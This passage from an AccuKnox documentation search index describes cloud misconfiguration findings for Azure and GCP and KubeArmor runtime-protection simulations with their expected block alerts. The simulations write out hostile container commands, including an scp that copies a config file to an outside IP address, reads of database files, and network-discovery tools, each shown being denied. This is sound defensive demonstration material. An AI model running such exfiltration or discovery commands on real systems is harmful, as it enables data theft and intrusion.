Scenario","text":"<p>Azure Network Security misconfigurations present various vulnerabilities. Below are some common issues:</p> <ol> <li> <p>Open HTTP Ports: Publicly exposed HTTP ports, like port 80, expose Azure resources to the internet, potentially allowing unauthorized access or data interception.</p> </li> <li> <p>Exposed RDP Ports: Leaving Remote Desktop Protocol (RDP) ports (default port 3389) open in Azure Network Security Groups (NSGs) increases the risk of brute-force attacks, unauthorized entry, and malware deployment.</p> </li> </ol>"},{"location":"use-cases/cloud/azure-network/#how-to-identify-and-remediate-open-http-ports-with-accuknox","title":"How to Identify and Remediate Open HTTP Ports with AccuKnox","text":"<ol> <li> <p>Access the Dashboard: Log in to the AccuKnox portal and navigate to <code>Issues &gt; Findings</code>.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword port 80 or open HTTP to list relevant findings.</p> </li> <li> <p>Review Findings: Analyze each open port finding and assess its severity and associated risks.</p> </li> <li> <p>Remediate: Follow the detailed remediation steps to close or secure open ports.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/azure-network/#remediation-steps","title":"Remediation Steps","text":"<ol> <li> <p>Review the identified open HTTP port in the AccuKnox findings.</p> </li> <li> <p>Create a ticket to track the resolution process.</p> </li> <li> <p>Follow the recommended steps and security references linked within the findings for precise remediation.</p> </li> <li> <p>HTTP access, close the firewall or security group-level port.</p> </li> <li> <p>Verify remediation in the AccuKnox portal.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/azure-network/#best-practices-to-avoid-open-http-ports","title":"Best Practices to Avoid Open HTTP Ports","text":"<ul> <li> <p>Use HTTPS instead of HTTP to ensure secure, encrypted communication.</p> </li> <li> <p>Regularly audit firewall rules and security group configurations to identify and close unnecessary open ports.</p> </li> <li> <p>Continuously monitor cloud environments using AccuKnox CSPM for real-time detection of open ports.</p> </li> </ul>"},{"location":"use-cases/cloud/azure-network/#how-to-identify-and-remediate-open-rdp-ports-in-azure-nsgs","title":"How to Identify and Remediate Open RDP Ports in Azure NSGs","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access <code>Issues &gt; Findings</code>.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword RDP to list relevant findings.</p> </li> <li> <p>Review Findings: Analyze identified Open RDP access and assess the associated risk severity.</p> </li> <li> <p>Take Action: Follow the remediation guidance provided within the platform</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/azure-network/#remediation-steps_1","title":"Remediation Steps","text":"<ol> <li> <p>Navigate to <code>Issues &gt; Findings</code> in the AccuKnox portal.</p> </li> <li> <p>Select the finding related to Open RDP</p> </li> <li> <p>Create a ticket to track the resolution process.</p> </li> <li> <p>Follow the recommended steps and security references linked within the findings for precise remediation.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/azure-network/#best-practices","title":"Best Practices","text":"<ul> <li> <p>Avoid exposing RDP ports directly to the public internet; use VPNs or Azure Bastion for secure access.</p> </li> <li> <p>Regularly audit NSG rules to identify and remove unnecessary open ports.</p> </li> <li> <p>Monitor all port configurations using AccuKnox CSPM for real-time detection and remediation.</p> </li> </ul>"},{"location":"use-cases/cloud/azure/","title":"Azure Use Cases","text":""},{"location":"use-cases/cloud/azure/#azure-use-cases","title":"Azure Use Cases","text":"<p>Network Security</p> <p>Compute Security</p> <p>Database Security</p>"},{"location":"use-cases/cloud/azure/#maximizing-azure-cloud-security","title":"Maximizing Azure Cloud Security","text":"<p>AccuKnox's Cloud Security Posture Management (CSPM) enhances the security of Azure cloud environments by continuously monitoring for misconfigurations and compliance issues. It provides actionable insights to mitigate risks in real-time, ensuring a secure and compliant cloud infrastructure. By addressing vulnerabilities proactively, organizations can maintain robust cloud security and meet regulatory requirements efficiently.</p>"},{"location":"use-cases/cloud/azure/#why-use-accuknox-cspm","title":"Why Use AccuKnox CSPM?","text":"<p>AccuKnox CSPM helps identify and resolve potential vulnerabilities, ensuring that security breaches are prevented before they occur. It simplifies compliance by providing continuous monitoring aligned with frameworks like GDPR, HIPAA, and ISO. With risk-based prioritization, CSPM enables organizations to focus on addressing critical issues, while assistive remediation streamlines issue resolution. Additionally, it enhances visibility into dynamic cloud environments, uncovering hidden risks and offering in-depth insights for improved decision-making.</p> <p>AccuKnox CSPM offers real-time monitoring to detect security gaps and compliance violations, ensuring immediate action can be taken. It categorizes findings by severity, prioritizing critical risks for efficient resource allocation. The platform integrates seamlessly with existing ticketing systems, simplifying workflows and improving operational efficiency. Detailed reports and actionable insights guide teams through remediation steps, making it easy to address issues effectively.</p> <p>To maximize the effectiveness of AccuKnox CSPM, regularly monitor the Cloud Posture Management dashboard to stay informed about new findings and compliance reports. Focus on addressing high-risk issues promptly to mitigate potential vulnerabilities. Continuous monitoring ensures your cloud environment remains secure and compliant over time.</p>"},{"location":"use-cases/cloud/gcp-compute/","title":"GCP Compute Security","text":"<p>Securing compute resources in Google Cloud Platform (GCP) is essential to protect sensitive data, prevent unauthorized access, and maintain a robust security posture. Misconfigurations such as unused disks, improper encryption practices, and weak SSH configurations can lead to data breaches and operational risks. Ensuring compute resources are configured securely is a cornerstone of cloud security.</p> <p>AccuKnox Cloud Security Posture Management (CSPM) helps identify misconfigurations in GCP network settings and provides actionable recommendations to mitigate risks, ensuring compliance with security standards and enhancing overall network security.</p>"},{"location":"use-cases/cloud/gcp-compute/#common-compute-misconfigurations-in-gcp","title":"Common Compute Misconfigurations in GCP","text":"<ol> <li> <p>Unused Compute Disks     Unused disks are a potential risk and unnecessary cost in your GCP environment. These disks can contain sensitive data and remain vulnerable to unauthorized access if not properly managed. Deleting unused disks reduces the attack surface and optimizes costs.</p> </li> <li> <p>Customer Supplied Encryption Key (CSEK) Not Enabled     Without CSEK, disks rely on Google-managed keys for encryption. While secure, enabling CSEK provides an additional layer of control by allowing you to manage your encryption keys.</p> </li> <li> <p>Project-Wide SSH Keys Enabled     Allowing project-wide SSH keys for instances introduces significant risk by potentially enabling unauthorized access to all instances in a project. Enforcing instance-specific SSH keys ensures that access is limited and controlled.</p> </li> </ol>"},{"location":"use-cases/cloud/gcp-compute/#why-these-misconfigurations-are-a-risk","title":"Why These Misconfigurations Are a Risk","text":"<ul> <li> <p>Data Breach: Unused or improperly encrypted disks can lead to unauthorized data access, risking compliance violations and operational damage.</p> </li> <li> <p>Unauthorized Access: Weak SSH configurations, such as project-wide keys, allow attackers to gain access to multiple instances in your project.</p> </li> <li> <p>Cost Inefficiencies: Unused compute disks incur unnecessary costs while offering no operational benefit.</p> </li> </ul>"},{"location":"use-cases/cloud/gcp-compute/#how-to-identify-and-remediate-compute-misconfigurations-with-accuknox","title":"How to Identify and Remediate Compute Misconfigurations with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Access the AccuKnox portal and go to Issues &gt; Findings.</p> </li> <li> <p>Filter Results: Use keywords like \"disk,\" \"encryption,\" or \"SSH\" to locate findings related to unused disks, encryption settings, and SSH access.</p> </li> <li> <p>Review Findings: Analyze the findings for severity and potential impact. Prioritize issues like unencrypted disks and weak SSH configurations for remediation.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/gcp-compute/#remediation-steps-for-compute-security-issues","title":"Remediation Steps for Compute Security Issues","text":"<ol> <li> <p>Unused Compute Disks:</p> <ul> <li> <p>Review and identify unused compute disks.</p> </li> <li> <p>Delete unused disks to reduce the attack surface and optimize costs.</p> </li> </ul> </li> <li> <p>CSEK Not Enabled:</p> <ul> <li> <p>Delete the disk and recreate it with Customer Supplied Encryption Key (CSEK) enabled.</p> </li> <li> <p>Refer to Google Cloud Documentation for CSEK configuration.</p> </li> </ul> </li> <li> <p>Project-Wide SSH Keys:</p> <ul> <li> <p>Disable project-wide SSH keys by configuring instances to allow only instance-level SSH keys.</p> </li> <li> <p>Use IAM roles and policies to enforce strict SSH access controls.</p> </li> </ul> </li> </ol> <p></p>"},{"location":"use-cases/cloud/gcp-compute/#best-practices-for-compute-security-in-gcp","title":"Best Practices for Compute Security in GCP","text":"<ul> <li> <p>Regularly Audit Compute Resources:     Continuously monitor and audit compute disks to ensure no unused disks are present in the environment.</p> </li> <li> <p>Enable CSEK:     Use Customer Supplied Encryption Keys for all compute disks to maintain control over encryption and decryption processes.</p> </li> <li> <p>Secure SSH Access:     Restrict SSH access to instances by disabling project-wide keys and allowing only instance-specific SSH access. Use IAM roles and policies for granular access control.</p> </li> <li> <p>Monitor Compute Security Continuously:     Leverage AccuKnox CSPM to monitor compute resource configurations and detect misconfigurations in real-time.</p> </li> </ul> <p>By addressing compute security misconfigurations and following best practices, you can significantly reduce the risk of unauthorized access and ensure a secure, compliant GCP environm</p>"},{"location":"use-cases/cloud/gcp-iam/","title":"GCP IAM Security","text":"<p>Securing Identity and Access Management (IAM) configurations is essential for preventing unauthorized access, privilege escalation, and data breaches in Google Cloud Platform (GCP). Misconfigurations in IAM roles, service accounts, and API keys can expose GCP environments to significant risks, including unauthorized access, misuse of resources, and compliance violations.</p> <p>AccuKnox CSPM provides continuous monitoring and real-time detection of misconfigurations in GCP IAM settings. It helps organizations proactively identify excessive permissions, misconfigured service accounts, and improper API key restrictions, ensuring a secure and compliant cloud environment.</p>"},{"location":"use-cases/cloud/gcp-iam/#common-misconfigurations-in-gcp-iam","title":"Common Misconfigurations in GCP IAM","text":"<ol> <li> <p>Service Account Admin: Global     Service accounts with overly broad permissions (admin or owner roles) pose significant security risks. These accounts may have more privileges than required for their purpose, making them prime targets for attackers. Misconfigured service accounts can be exploited to escalate privileges, manipulate resources, or exfiltrate sensitive data.</p> </li> <li> <p>API Key API Restriction: Global     API keys without proper restrictions allow attackers to use the keys for unauthorized access to GCP resources. Unrestricted API keys expose services to abuse, increasing the risk of unauthorized interactions with GCP APIs.</p> </li> </ol>"},{"location":"use-cases/cloud/gcp-iam/#why-excessive-permissions-in-iam-and-service-accounts-are-a-risk","title":"Why Excessive Permissions in IAM and Service Accounts Are a Risk","text":"<p>Excessive IAM permissions and improperly configured service accounts can lead to:</p> <ul> <li> <p>Unauthorized Access: Service accounts with admin, owner, or write permissions can be exploited by attackers to gain control over GCP resources.</p> </li> <li> <p>Privilege Escalation: Misconfigured IAM roles can allow attackers to escalate privileges within the environment, gaining broader access to critical resources.</p> </li> <li> <p>Resource Misuse: Compromised service accounts can manipulate, delete, or steal sensitive data and resources, leading to operational disruptions.</p> </li> <li> <p>Compliance Violations: Excessive permissions can result in violations of frameworks such as GDPR, HIPAA, or ISO, leading to legal and financial penalties.</p> </li> </ul>"},{"location":"use-cases/cloud/gcp-iam/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker identifies a service account with admin privileges, either through direct access or exploiting weak security practices like weak credentials or lack of MFA. The attacker uses these privileges to escalate access, modify GCP configurations, or exfiltrate sensitive data. Similarly, an API key without restrictions is compromised, and the attacker uses it to interact with GCP APIs, causing potential misuse or data breaches.</p>"},{"location":"use-cases/cloud/gcp-iam/#how-to-identify-and-remediate-excessive-permissions-with-accuknox","title":"How to Identify and Remediate Excessive Permissions with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access Issues &gt; Findings.</p> </li> <li> <p>Filter Results: Use the cloud findings filter and search for \"service account\" or \"API key\" to identify misconfigured service accounts or unrestricted API keys.</p> </li> <li> <p>Review Findings: Analyze the identified findings to assess the risk associated with excessive permissions in service accounts or API keys that are not restricted properly.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/gcp-iam/#remediation-steps-for-service-account-admin-and-api-key-restrictions","title":"Remediation Steps for Service Account Admin and API Key Restrictions","text":"<ol> <li> <p>Identify the Finding:     Locate the findings related to misconfigured service accounts with excessive permissions (e.g., Service Account Admin) or API keys without restrictions.</p> </li> <li> <p>Create a Ticket:     Create a ticket to track the remediation process and ensure visibility of the issue.</p> </li> <li> <p>Follow Remediation Guidance:</p> <ul> <li> <p>Service Account Admin:     Remove unnecessary admin, owner, or write privileges from service accounts. Apply the principle of least privilege to limit access only to the necessary resources.</p> </li> <li> <p>API Key Restrictions:     Ensure API keys are restricted to specific IP addresses, services, or resources. Apply API key restrictions to prevent unauthorized use.</p> </li> </ul> </li> <li> <p>Verify Resolution:     Confirm that the issue has been remediated by reviewing updated IAM roles, service account configurations, and API key restrictions in the AccuKnox portal.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/gcp-iam/#best-practices-for-gcp-iam-security","title":"Best Practices for GCP IAM Security","text":"<ul> <li> <p>Apply Least Privilege:     Always ensure that service accounts and IAM roles are granted the minimum permissions required for their tasks. Avoid granting admin or owner roles unless absolutely necessary.</p> </li> <li> <p>Restrict API Keys:     Ensure that API keys are restricted by IP addresses, specific services, or use cases to reduce the risk of unauthorized access.</p> </li> <li> <p>Regularly Audit IAM Roles and Service Accounts:     Continuously review and audit IAM roles and permissions to ensure compliance with the principle of least privilege. Regularly check service account configurations to ensure they have appropriate, minimal access.</p> </li> <li> <p>Monitor IAM Security Continuously:     Use AccuKnox CSPM to continuously monitor IAM configurations and detect any misconfigurations, excessive permissions, or unauthorized access attempts.</p> </li> <li> <p>Enable Multi-Factor Authentication (MFA):     Enable MFA for all IAM users and service accounts with access to critical resources to add an extra layer of protection.</p> </li> </ul> <p>By proactively managing IAM configurations, limiting permissions, and applying security best practices, organizations can significantly reduce the risks associated with misconfigured IAM roles, service accounts, and API keys in GCP, ensuring a secure and compliant cloud environment.</p>"},{"location":"use-cases/cloud/gcp-network/","title":"GCP Network Security","text":"<p>Network security is vital to protecting your Google Cloud Platform (GCP) environment from unauthorized access, data exfiltration, and malicious attacks. Misconfigured network settings, such as open ports or unrestricted SSH access, can expose your instances to significant security risks. Ensuring proper network configurations, including restricted access and closed ports, is crucial for maintaining a secure GCP environment.</p> <p>AccuKnox Cloud Security Posture Management (CSPM) helps identify misconfigurations in GCP network settings and provides actionable recommendations to mitigate risks, ensuring compliance with security standards and enhancing overall network security.</p>"},{"location":"use-cases/cloud/gcp-network/#common-network-misconfigurations-in-gcp","title":"Common Network Misconfigurations in GCP","text":"<ol> <li> <p>Publicly Exposed HTTP Server (TCP Port 80)     Publicly accessible HTTP servers with TCP port 80 open expose sensitive services to the internet. If not restricted, attackers can exploit vulnerabilities in your server to gain unauthorized access or compromise services.</p> </li> <li> <p>All Ports Open to the Public     Allowing all ports to be open to the public creates an attack surface that hackers can exploit. Restricting access to only necessary ports, and ensuring that unused ports are closed or restricted, minimizes exposure and reduces the risk of attacks.</p> </li> </ol>"},{"location":"use-cases/cloud/gcp-network/#why-these-network-misconfigurations-are-a-risk","title":"Why These Network Misconfigurations Are a Risk","text":"<ul> <li> <p>Unauthorized Access: Unrestricted SSH access or open ports allow attackers to exploit vulnerabilities, potentially gaining control over your instances.</p> </li> <li> <p>Data Exfiltration or Malicious Use: Public-facing HTTP servers or open ports can be targeted for attacks such as DDoS, data theft, or data interception.</p> </li> <li> <p>Compliance Violations: Exposing sensitive services to the public internet can violate data protection regulations like GDPR, HIPAA, or ISO standards, leading to penalties.</p> </li> </ul>"},{"location":"use-cases/cloud/gcp-network/#attack-scenario","title":"Attack Scenario","text":"<ol> <li> <p>Public HTTP Server Exposure:     Publicly exposed HTTP ports, like port 80, expose resources to the internet, potentially allowing data interception.</p> </li> <li> <p>Open Ports Vulnerability:     All ports are open to the public, allowing an attacker to probe the environment and exploit exposed services. The attacker could target vulnerable services running on unused ports, gaining unauthorized access to sensitive resources.</p> </li> </ol>"},{"location":"use-cases/cloud/gcp-network/#how-to-identify-and-remediate-network-misconfigurations-with-accuknox","title":"How to Identify and Remediate Network Misconfigurations with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access Issues &gt; Findings.</p> </li> <li> <p>Filter Results: Use the cloud findings filter and search for keywords like port 80, or open ports to identify instances with misconfigurations.</p> </li> <li> <p>Review Findings: Analyze the identified findings related to open ports, public HTTP servers, and SSH misconfigurations. Assess the risk associated with each finding.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/gcp-network/#remediation-steps-for-network-security-issues","title":"Remediation Steps for Network Security Issues","text":"<ol> <li> <p>Identify the Finding:     Locate the findings related to publicly exposed HTTP servers, or open ports.</p> </li> <li> <p>Create a Ticket:     Create a ticket to track the remediation process and assign the appropriate team for resolution.</p> </li> <li> <p>Follow Remediation Guidance:</p> <ul> <li> <p>Public HTTP Server Exposure:     Restrict access to TCP port 80 (HTTP) to known IP addresses or trusted sources. Avoid exposing sensitive services like HTTP to the public unless necessary.</p> </li> <li> <p>All Ports Open to the Public:     Restrict unnecessary ports, allowing access only from specific, trusted IP addresses or networks. Review the firewall and network access control lists (ACLs) regularly.</p> </li> </ul> </li> <li> <p>Verify Resolution:     Confirm that the misconfigurations have been remediated by reviewing updated firewall rules and network configurations access settings.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/gcp-network/#best-practices-for-gcp-network-security","title":"Best Practices for GCP Network Security","text":"<ul> <li> <p>Limit Public Access to Critical Ports:     Restrict access to sensitive ports (e.g., HTTP, HTTPS) to known IP addresses or trusted networks. Ensure that only necessary services are exposed to the internet.</p> </li> <li> <p>Use Firewalls and ACLs:     Continuously configure and audit firewall rules and network access control lists (ACLs) to block unnecessary ports and limit access based on IP address or range.</p> </li> <li> <p>Monitor Network Security Continuously:     Use AccuKnox CSPM to monitor your network security continuously for any misconfigurations or unauthorized access attempts, ensuring timely remediation.</p> </li> <li> <p>Implement Zero Trust Networking:     Adopt a zero-trust model for your network by verifying every connection, ensuring that only authenticated and authorized users or devices can access resources.</p> </li> </ul>"},{"location":"use-cases/cloud/gcp/","title":"Google Cloud Platform Use Cases","text":""},{"location":"use-cases/cloud/gcp/#google-cloud-platform-use-cases","title":"Google Cloud Platform Use Cases","text":"<p>IAM Security</p> <p>Network Security</p> <p>Compute Security</p> <p>AccuKnox's Cloud Security Posture Management (CSPM) enhances the security and compliance of Google Cloud Platform (GCP) environments by detecting and remediating misconfigurations in real time. It provides visibility into security risks, prioritizes critical issues, and ensures continuous compliance with industry standards.</p>"},{"location":"use-cases/cloud/gcp/#why-use-accuknox-cspm-for-gcp","title":"Why Use AccuKnox CSPM for GCP?","text":"<p>AccuKnox CSPM enables organizations to secure GCP environments proactively, ensuring both operational efficiency and compliance. It detects and addresses misconfigurations early, preventing security gaps from escalating into vulnerabilities. By identifying hidden risks in evolving GCP architectures, it provides visibility into dynamic cloud environments. The platform prioritizes critical misconfigurations for quick remediation, ensuring that resources are focused where they are needed most. AccuKnox CSPM also ensures continuous compliance by monitoring alignment with frameworks like GDPR, HIPAA, and ISO. Additionally, it integrates with ticketing systems to automate fixes, streamlining issue tracking and resolution processes.</p>"},{"location":"use-cases/cloud/gcp/#key-benefits","title":"Key Benefits","text":"<ul> <li> <p>Preventive Security: Stops misconfigurations from exposing sensitive data.</p> </li> <li> <p>Visibility &amp; Insights: Provides detailed findings on security gaps and compliance status.</p> </li> <li> <p>Prioritized Remediation: Focuses resources on resolving high-severity risks.</p> </li> <li> <p>Ongoing Compliance: Ensures GCP environments meet required security standards.</p> </li> <li> <p>Efficient Workflow: Automates ticket generation for faster response and resolution.</p> </li> </ul> <p>AccuKnox CSPM continuously monitors GCP environments to detect misconfigurations and compliance violations. It prioritizes high-risk findings, automates ticketing for quick resolution, and ensures real-time compliance tracking.</p> <p>For the best practices, regularly check findings, focus on high-severity issues, leverage automation for faster remediation, and optimize configurations to adapt to changing workloads.</p>"},{"location":"use-cases/res/admin-tools/","title":"Admin tools","text":""},{"location":"use-cases/res/admin-tools/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it dvwa-web-566855bc5b-4j4vl -- bash\nroot@dvwa-web-566855bc5b-4j4vl:/var/www/html# kubectl\nbash: /usr/bin/kubectl: Permission denied\nroot@dvwa-web-566855bc5b-4j4vl:/var/www/html#\n</code></pre>"},{"location":"use-cases/res/admin-tools/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": null,\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"32015ebeea9e1f4d4e7dbf6608c010ef2b34c48f1af11a5c6f0ea2fd27c6ba6c\",\n  \"ContainerImage\": \"docker.io/cytopia/dvwa:php-8.1@sha256:f7a9d03b1dfcec55757cc39ca2470bdec1618b11c4a51052bb4f5f5e7d78ca39\",\n  \"ContainerName\": \"dvwa\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"1167b21433f2a4e78a4c6875bb34232e6a2b3c8535e885bb4f9e336fd2801d92\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 38035,\n  \"HostPPID\": 37878,\n  \"Labels\": \"tier=frontend,app=dvwa-web\",\n  \"Message\": \"\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"dvwa-web\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 554,\n  \"PPID\": 548,\n  \"PodName\": \"dvwa-web-566855bc5b-4j4vl\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/kubectl\",\n  \"Resource\": \"/usr/bin/kubectl\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"\",\n  \"Timestamp\": 1696326880,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-10-03T09:54:40.056501Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/conf-data/","title":"Conf data","text":""},{"location":"use-cases/res/conf-data/#simulation","title":"Simulation","text":"<p>With a shell different than the user owning the file: <pre><code>$ cat /etc/ca-certificates.conf                                                                                         \ncat: /etc/ca-certificates.conf: Permission denied                                                                       \n$                                                   \n</code></pre></p>"},{"location":"use-cases/res/conf-data/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"d3mo\",\n  \"ContainerID\": \"548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"ContainerName\": \"wordpress\",\n  \"Data\": \"syscall=SYS_OPEN flags=O_RDONLY\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"master-node\",\n  \"HostPID\": 39039,\n  \"HostPPID\": 38787,\n  \"Labels\": \"app=wordpress\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"wordpress\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 220,\n  \"PPID\": 219,\n  \"ParentProcessName\": \"/bin/dash\",\n  \"PodName\": \"wordpress-fb448db97-wj7n7\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/bin/cat\",\n  \"Resource\": \"/etc/ca-certificates.conf\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/bin/cat /etc/ca-certificates.conf\",\n  \"Timestamp\": 1696485467,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 1000,\n  \"UpdatedTime\": \"2023-10-05T05:57:47.935622Z\",\n  \"cluster_id\": \"2302\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/db-access/","title":"Db access","text":""},{"location":"use-cases/res/db-access/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-65nqf:/# cd var/lib/mysql\nroot@mysql-74775b4bf4-65nqf:/var/lib/mysql# cat ib_logfile1\ncat: ib_logfile1: Permission denied\nroot@mysql-74775b4bf4-65nqf:/var/lib/mysql#\n</code></pre>"},{"location":"use-cases/res/db-access/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": [\n    \"CIS\",\n    \"CIS_Linux\"\n  ],\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4\",\n  \"ContainerImage\": \"docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\",\n  \"ContainerName\": \"mysql\",\n  \"Data\": \"syscall=SYS_OPEN flags=O_RDONLY\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"a7b7d91d52de395fe6cda698e89e0112e6f3ab818ea331cee60295a8ede358c8\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 29898,\n  \"HostPPID\": 29752,\n  \"Labels\": \"app=mysql\",\n  \"Message\": \"Alert! Attempt to make changes to database detected\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"mysql\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 230,\n  \"PPID\": 223,\n  \"PodName\": \"mysql-74775b4bf4-65nqf\",\n  \"PolicyName\": \"ksp-block-mysql-dir\",\n  \"ProcessName\": \"/bin/cat\",\n  \"Resource\": \"/var/lib/mysql/ib_logfile1\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"1\",\n  \"Source\": \"/bin/cat ib_logfile1\",\n  \"Tags\": \"CIS,CIS_Linux\",\n  \"Timestamp\": 1696322555,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-10-03T08:42:35.618890Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/disc-tools/","title":"Disc tools","text":""},{"location":"use-cases/res/disc-tools/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it dvwa-web-566855bc5b-xtgwq -- bash\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html# netstat\nbash: /bin/netstat: Permission denied\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html# ifconfig\nbash: /sbin/ifconfig: Permission denied\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html#\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html# arp\nbash: /usr/sbin/arp: Permission denied\n</code></pre>"},{"location":"use-cases/res/disc-tools/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"no-trust\",\n  \"ContainerID\": \"e8ac2e227d293e76ab81a34945b68f72a2618ed3275ac64bb6a82f9cd2d014f1\",\n  \"ContainerImage\": \"docker.io/cytopia/dvwa:php-8.1@sha256:f7a9d03b1dfcec55757cc39ca2470bdec1618b11c4a51052bb4f5f5e7d78ca39\",\n  \"ContainerName\": \"dvwa\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 35592,\n  \"HostPPID\": 35557,\n  \"Labels\": \"tier=frontend,app=dvwa-web\",\n  \"Message\": \"Network service has been scanned!\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"dvwa-web\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 989,\n  \"PPID\": 983,\n  \"ParentProcessName\": \"/bin/bash\",\n  \"PodName\": \"dvwa-web-566855bc5b-npjn8\",\n  \"PolicyName\": \"harden-dvwa-web-network-service-scanning\",\n  \"ProcessName\": \"/bin/netstat\",\n  \"Resource\": \"/bin/netstat\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"5\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"MITRE,FGT1046,CIS\",\n  \"Timestamp\": 1696501152,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-05T10:19:12.809606Z\",\n  \"cluster_id\": \"4225\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/res/ens-tls/","title":"Ens tls","text":""},{"location":"use-cases/res/ens-tls/#getting-started","title":"Getting Started","text":""},{"location":"use-cases/res/ens-tls/#scan-k8s-services","title":"Scan k8s services","text":"<p>For k8s, the solution gets deployed as a job that scans the k8s service ports.</p> <p>Clone the GitHub repo link: https://github.com/kubearmor/k8tls <pre><code>Git clone https://github.com/kubearmor/k8tls.git\n</code></pre></p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/k8tls/main/k8s/job.yaml\nkubectl logs -n k8tls $(kubectl get pod -n k8tls -l job-name=k8tls -o name) -f\n</code></pre>"},{"location":"use-cases/res/file-copy/","title":"File copy","text":""},{"location":"use-cases/res/file-copy/#simulation","title":"Simulation","text":"<pre><code>root@wordpress-fb448db97-wj7n7:/usr/bin# scp /etc/ca-certificates.conf 104.192.3.74:/mine/                              \nbash: /usr/bin/scp: Permission denied                                                                                   \nroot@wordpress-fb448db97-wj7n7:/usr/bin#     \n</code></pre>"},{"location":"use-cases/res/file-copy/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"d3mo\",\n  \"ContainerID\": 